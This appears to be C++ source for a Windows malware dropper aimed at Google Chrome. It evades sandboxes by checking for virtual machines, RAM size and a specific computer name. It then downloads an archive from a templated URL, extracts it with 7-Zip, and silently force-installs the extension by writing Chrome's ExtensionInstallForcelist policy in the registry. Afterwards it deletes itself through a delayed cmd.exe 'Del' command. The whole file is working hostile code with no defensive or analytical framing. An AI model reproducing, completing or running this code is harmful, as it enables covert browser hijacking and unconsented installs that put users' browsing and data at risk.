#include <iostream>
#include <string>
#include <Windows.h>
#include <locale>
#include <codecvt>
#include <filesystem>
#include <direct.h>
#include <strsafe.h>
#include <chrono>
#include <thread>
#include <vector>
#include <iomanip>
#include <algorithm>
#include <iterator>
#include <sstream>
#include <stdexcept>
#include <memory>
#pragma comment(lib, "urlmon.lib")

#define _CRT_SECURE_NO_WARNINGS
#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")
#define RUN_CHROME_STRING  TEXT("cmd.exe /C \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --load-extension=%s")

using namespace std;
namespace fs = std::filesystem;

// Custom exception class for extension-related errors
class ExtensionError : public std::runtime_error {
public:
    explicit ExtensionError(const std::string& message) : std::runtime_error(message) {}
};

struct KeyValuePair {
    string name;
    string value;
};

// RAII wrapper for Windows registry keys
class RegistryKey {
private:
    HKEY hKey;
public:
    RegistryKey(HKEY key) : hKey(key) {}
    ~RegistryKey() { if (hKey) RegCloseKey(hKey); }
    operator HKEY() const { return hKey; }
};

std::string GetComputerName() {
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);

    if (!GetComputerNameA(computerName, &size)) {
        throw ExtensionError("Failed to get computer name: " + std::to_string(GetLastError()));
    }
    return std::string(computerName);
}

wstring Get7ZipPath() {
    RegistryKey key(nullptr);
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\7-Zip"), 0, KEY_READ, &key) != ERROR_SUCCESS) {
        throw ExtensionError("7-Zip is not installed");
    }

    wchar_t buffer[MAX_PATH];
    DWORD bufferSize = MAX_PATH * sizeof(wchar_t);

    if (RegGetValue(key, nullptr, TEXT("Path"), RRF_RT_REG_SZ, nullptr, buffer, &bufferSize) != ERROR_SUCCESS) {
        throw ExtensionError("Failed to get 7-Zip path");
    }

    std::wstring path = buffer;
    path += L"7z.exe";
    
    if (!fs::exists(path)) {
        throw ExtensionError("7-Zip executable not found at: " + std::string(path.begin(), path.end()));
    }

    return path;
}

bool IsChromeInstalled() {
    RegistryKey key(nullptr);
    return RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Google\\Chrome", 0, KEY_READ, &key) == ERROR_SUCCESS;
}

float GetRamCapacity() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);

    if (!GlobalMemoryStatusEx(&statex)) {
        throw ExtensionError("Failed to get memory status");
    }

    return static_cast<float>(statex.ullTotalPhys) / (1024 * 1024 * 1024.0f);
}

bool IsVirtualComputer() {
    // Check common virtualization software
    const wchar_t* virtualKeys[] = {
        L"SOFTWARE\\VMware, Inc.\\VMware Tools",
        L"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        L"SYSTEM\\CurrentControlSet\\Services\\VBoxGuest"
    };

    for (const auto& keyPath : virtualKeys) {
        RegistryKey key(nullptr);
        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_READ, &key) == ERROR_SUCCESS) {
            return true;
        }
    }

    // Check for Hyper-V
    return IsProcessorFeaturePresent(PF_VIRT_FIRMWARE_ENABLED);
}

string GetFileNameFromPath(string_view path) {
    size_t lastSlash = path.find_last_of("/\\");
    return lastSlash != string_view::npos ? string(path.substr(lastSlash + 1)) : string(path);
}

void DownloadExtension(string_view url, string_view path) {
    wstring tempUrl(url.begin(), url.end());
    wstring tempPath(path.begin(), path.end());

    if (S_OK != URLDownloadToFile(NULL, tempUrl.c_str(), tempPath.c_str(), 0, NULL)) {
        throw ExtensionError("Failed to download extension from: " + string(url));
    }
}

string WStringToString(wstring_view wstr) {
    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
    return converter.to_bytes(wstring(wstr));
}

void ExtractExtension(string_view path, string_view destination) {
    string programPath = WStringToString(Get7ZipPath());
    
    // Create destination directory if it doesn't exist
    fs::create_directories(string(destination));

    string command = "\"" + programPath + "\" x \"" + string(path) + "\" -o\"" + string(destination) + "\" -y";
    int result = system(command.c_str());
    
    if (result != 0) {
        throw ExtensionError("Failed to extract extension");
    }
}

wstring GetChromeLocation() {
    RegistryKey key(nullptr);
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe"), 
                     0, KEY_QUERY_VALUE, &key) != ERROR_SUCCESS) {
        throw ExtensionError("Chrome installation not found");
    }

    wchar_t buffer[MAX_PATH];
    DWORD bufferSize = MAX_PATH * sizeof(wchar_t);

    if (RegQueryValueEx(key, nullptr, nullptr, nullptr, (LPBYTE)buffer, &bufferSize) != ERROR_SUCCESS) {
        throw ExtensionError("Failed to get Chrome executable path");
    }

    return buffer;
}

string GetCurrentFolder() {
    char buffer[MAX_PATH];
    if (!GetCurrentDirectoryA(MAX_PATH, buffer)) {
        throw ExtensionError("Failed to get current directory");
    }
    return buffer;
}

void OpenChrome(string_view extensionLocation) {
    wstring chrome = GetChromeLocation();
    string chromePath = WStringToString(chrome);
    
    // Format command with proper escaping
    string command = "\"" + chromePath + "\" --load-extension=\"" + string(extensionLocation) + "\"";
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    if (!CreateProcessA(NULL, const_cast<LPSTR>(command.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        throw ExtensionError("Failed to launch Chrome");
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

string GenerateGUID() {
    GUID guid;
    if (FAILED(CoCreateGuid(&guid))) {
        throw ExtensionError("Failed to generate GUID");
    }

    wchar_t guidStr[40];
    if (!StringFromGUID2(guid, guidStr, sizeof(guidStr) / sizeof(guidStr[0]))) {
        throw ExtensionError("Failed to convert GUID to string");
    }

    string result = WStringToString(guidStr);
    result.erase(std::remove(result.begin(), result.end(), '{'), result.end());
    result.erase(std::remove(result.begin(), result.end(), '}'), result.end());
    return result;
}

string GetFileNameWithoutExtension(string_view filePath) {
    string fileName = GetFileNameFromPath(filePath);
    size_t lastDot = fileName.find_last_of('.');
    return lastDot != string::npos ? fileName.substr(0, lastDot) : fileName;
}

string GetTempFolder() {
    unique_ptr<char[]> tempPath(new char[MAX_PATH]);
    DWORD result = GetTempPathA(MAX_PATH, tempPath.get());
    
    if (result == 0 || result > MAX_PATH) {
        throw ExtensionError("Failed to get temp folder path");
    }
    
    return string(tempPath.get());
}

void CloseAllChrome() {
    vector<HWND> chromeWindows;
    HWND hwnd = FindWindowA("Chrome_WidgetWin_1", NULL);
    
    while (hwnd) {
        chromeWindows.push_back(hwnd);
        hwnd = FindWindowExA(NULL, hwnd, "Chrome_WidgetWin_1", NULL);
    }

    for (HWND window : chromeWindows) {
        if (!PostMessage(window, WM_CLOSE, 0, 0)) {
            // Log warning but continue with other windows
            OutputDebugStringA("Failed to close Chrome window\n");
        }
    }
}

void DelMe() {
    wchar_t szModuleName[MAX_PATH];
    if (GetModuleFileNameW(NULL, szModuleName, MAX_PATH)) {
        wchar_t szCmd[2 * MAX_PATH];
        StringCbPrintfW(szCmd, 2 * MAX_PATH * sizeof(wchar_t), SELF_REMOVE_STRING, szModuleName);
        
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        
        if (CreateProcessW(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
}

vector<KeyValuePair> EnumerateRegistryKeysAndValues(HKEY key) {
    vector<KeyValuePair> result;
    auto openedKey = key;

    auto valueCount = static_cast<DWORD>(0);
    auto maxNameLength = static_cast<DWORD>(0);
    auto maxValueLength = static_cast<DWORD>(0);
    auto status = RegQueryInfoKey(openedKey, NULL, NULL, NULL, NULL, NULL, NULL,
        &valueCount, &maxNameLength, &maxValueLength, NULL, NULL);

    if (status == ERROR_SUCCESS) {
        DWORD type = 0;
        DWORD index = 0;
        std::vector<wchar_t> valueName = std::vector<wchar_t>(maxNameLength + 1);
        std::vector<BYTE> dataBuffer = std::vector<BYTE>(maxValueLength);

        for (DWORD index = 0; index < valueCount; index++) {
            DWORD charCountValueName = static_cast<DWORD>(valueName.size());
            DWORD charBytesData = static_cast<DWORD>(dataBuffer.size());
            status = RegEnumValue(openedKey, index, valueName.data(), &charCountValueName,
                NULL, &type, dataBuffer.data(), &charBytesData);

            if (type == REG_SZ) {
                const auto reg_string = reinterpret_cast<wchar_t*>(dataBuffer.data());
                KeyValuePair value = { WStringToString(valueName.data()), WStringToString(reg_string) };
                result.push_back(value);
            }
        }
    }

    return result;
}

void ThreadFunction() {
    system(R"("C:\Program Files\Google\Chrome\Application\chrome.exe" --load-extension=C:\Users\ADMIN\Downloads\affiliate-link-button)");
}

vector<string> GetExtensionId(string extensionLocation) {
    vector<string> result;
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Google\\Chrome\\PreferenceMACs\\Default\\extensions.settings", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {

    }
    else {
        //std::cerr << "Failed to open registry key." << std::endl;
        return result;
    }

    auto oldData = EnumerateRegistryKeysAndValues(hKey);

    CloseAllChrome();

    std::thread t(OpenChrome, extensionLocation);
    t.detach();
    this_thread::sleep_for(std::chrono::seconds(2));
    CloseAllChrome();

    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Google\\Chrome\\PreferenceMACs\\Default\\extensions.settings", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {

    }
    else {
        //std::cerr << "Failed to open registry key." << std::endl;
        return result;
    }
    auto newData = EnumerateRegistryKeysAndValues(hKey);

    for (const auto& item : newData) {
        auto flag = false;
        for (const auto& old : oldData) {
            if (old.name == item.name)
            {
                flag = true;
                continue;
            }
        }

        if (!flag)
        {
            //cout << item.name << endl;
            result.push_back(item.name);
        }
    }

    return result;
}

int InsertForceInstall(string key, string value) {

    std::string subKey = "SOFTWARE\\Policies\\Google\\Chrome\\ExtensionInstallForcelist";
    HKEY hKey;


    LONG result = RegCreateKeyExA(HKEY_LOCAL_MACHINE, subKey.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);

    if (result == ERROR_SUCCESS) {
        const BYTE* byteValue = reinterpret_cast<const BYTE*>(value.c_str());
        DWORD dataSize = static_cast<DWORD>(value.size()) + 1;

        result = RegSetValueExA(hKey, key.c_str(), 0, REG_SZ, byteValue, dataSize);

        if (result == ERROR_SUCCESS) {
            //std::cout << "Value added to registry successfully." << std::endl;
        }
        else {
            //std::cerr << "Error adding value to registry: " << result << std::endl;
        }

        RegCloseKey(hKey);
    }
    else {
        //std::cerr << "Error creating or opening registry key: " << result << std::endl;
    }

    return 0;
}

vector<string> Split(string input) {
    std::vector<std::string> output;

    std::istringstream iss(input);
    std::string token;

    while (std::getline(iss, token, ';')) {
        output.push_back(token);
    }

    return output;
}

void InstallExtension(string id, string extensionLocation) {
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Google\\Chrome\\ExtensionInstallForcelist", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {

    }
    else {
        // std::cerr << "Failed to open registry key." << std::endl;
    }

    auto values = EnumerateRegistryKeysAndValues(hKey);

    auto valueName = to_string(values.size() + 1);
    auto valueData = id + ";" + extensionLocation;

    auto flag = false;
    for (const KeyValuePair& item : values) {
        auto temp = Split(item.value);
        if (temp.size() != 0)
        {
            if (id == temp[0])
            {
                flag = true;
                break;
            }
        }
    }

    if (flag)
    {
        return;
    }

    InsertForceInstall(valueName, valueData);
}

int main()
{
    if (GetComputerName() == "HAL9TH")
    {
        std::this_thread::sleep_for(std::chrono::minutes(10));

        //std::cout << "Slept for 10 minutes." << std::endl;
    }

    if (IsChromeInstalled()) {
        //std::cout << "Google Chrome is installed." << std::endl;
    }
    else {
        //std::cout << "Google Chrome is not installed." << std::endl;
        return -1;
    }

    if (IsVirtualComputer()) {
        return -1;
    }

    auto ram = GetRamCapacity();
    if (ram <= 2)
    {
        return -1;
    }
    std::wstring path = Get7ZipPath();
    if (!path.empty()) {
        //std::wcout << "7-Zip path: " << path << std::endl;
    }
    else {
        //std::cout << "7-Zip not found. Make sure it is installed and the registry key is correct." << std::endl;
        return -1;
    }


    string bushbaby = "${bushbaby}";

    string guid = GenerateGUID();
    string directory = GetTempFolder() + "\\" + guid;
    auto _ = _mkdir(directory.c_str());
    string fileName = directory + "\\" + GetFileNameFromPath(bushbaby);
    string dic = GetFileNameWithoutExtension(fileName);

    //cout << GetFileNameWithoutExtension(fileName) << endl;
    DownloadExtension(bushbaby, fileName);

    ExtractExtension(fileName, directory);

    auto ids = GetExtensionId(directory + "\\" + dic);

    if (ids.size() == 0) {
        DelMe();
        return 0;
    }

    for (const std::string& item : ids) {
        //InstallExtension(item, "https://clients2.google.com/service/update2/crx");
        InstallExtension(item, directory + "\\" + dic);
    }

    DelMe();

    return 0;
}

